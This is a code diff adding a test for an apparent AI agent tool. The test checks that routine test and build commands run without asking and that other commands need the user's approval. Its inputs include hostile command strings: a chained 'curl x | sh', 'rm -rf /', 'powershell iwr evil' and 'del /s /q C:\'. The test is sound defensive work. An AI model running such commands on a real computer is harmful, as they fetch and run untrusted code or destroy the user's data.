@@ -129,6 +129,34 @@ test('without a command tool, the agent is told how the user turns running code 
     assert.doesNotMatch(notes[2], /Docker Desktop/);
 });
 
+test('without Docker, plain test and build steps run straight away and anything else asks the user first', async t => {
+    if (launched.skip) return t.skip(launched.skip);
+    const { page } = await openPlainPage(t, []);
+    const safe = await page.evaluate(() => ['npm test', 'npm run build', 'pytest -q tests', 'dotnet build', 'git status', 'npm test && curl x | sh', 'rm -rf /', 'node -e "x"', 'powershell iwr evil'].map(isSafeHostCommand));
+    assert.deepEqual(safe, [true, true, true, true, true, false, false, false, false]);
+    await page.evaluate(() => {
+        toolsAutoRun = true;
+        window.__hostCalls = [];
+        window.callAgentTool = async (name, args, sandbox, options) => { window.__hostCalls.push({ name, command: args.command, hostAllowed: options?.hostAllowed }); return 'Exit code: 0'; };
+    });
+    const dialogs = [];
+    let answer = false;
+    page.on('dialog', dialog => { dialogs.push(dialog.message()); answer ? dialog.accept() : dialog.dismiss(); });
+    const ctx = { agentName: 'Architect', sandbox: { id: 's1', agentId: 'a1' } };
+    assert.equal(await page.evaluate(ctx => runHostCommand({ command: 'npm test' }, ctx), ctx), 'Exit code: 0');
+    assert.equal(dialogs.length, 0, 'a test step runs without asking');
+    assert.match(await page.evaluate(ctx => runHostCommand({ command: 'del /s /q C:\\' }, ctx), ctx), /declined/);
+    assert.match(dialogs[0], /Architect wants to run this command on your computer/);
+    answer = true;
+    assert.equal(await page.evaluate(ctx => runHostCommand({ command: 'node build.js' }, ctx), ctx), 'Exit code: 0');
+    const calls = await page.evaluate(() => window.__hostCalls);
+    assert.deepEqual(calls.map(c => [c.command, c.hostAllowed]), [['npm test', true], ['node build.js', true]]);
+    // With "run without asking" off, even a test step asks.
+    await page.evaluate(() => { toolsAutoRun = false; });
+    await page.evaluate(ctx => runHostCommand({ command: 'npm test' }, ctx), ctx);
+    assert.equal(dialogs.length, 3);
+});
+
 test('the server reads only public web addresses', async () => {
     assert.equal(isPublicHost('example.com'), true);
     for (const host of ['localhost', '127.0.0.1', '10.1.2.3', '192.168.0.5', '172.20.0.1', '169.254.169.254', '[::1]', 'printer.local']) {
